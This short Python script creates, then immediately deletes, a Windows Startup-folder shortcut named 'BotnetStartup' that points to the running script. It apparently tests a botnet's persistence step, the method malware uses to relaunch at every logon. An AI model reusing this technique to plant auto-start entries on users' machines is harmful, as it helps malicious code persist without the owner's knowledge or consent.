from pyshortcuts import make_shortcut
import sys
import os

destination = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')

make_shortcut(sys.argv[0], name="BotnetStartup", folder=destination)

os.remove(os.path.join(destination, 'BotnetStartup.lnk'))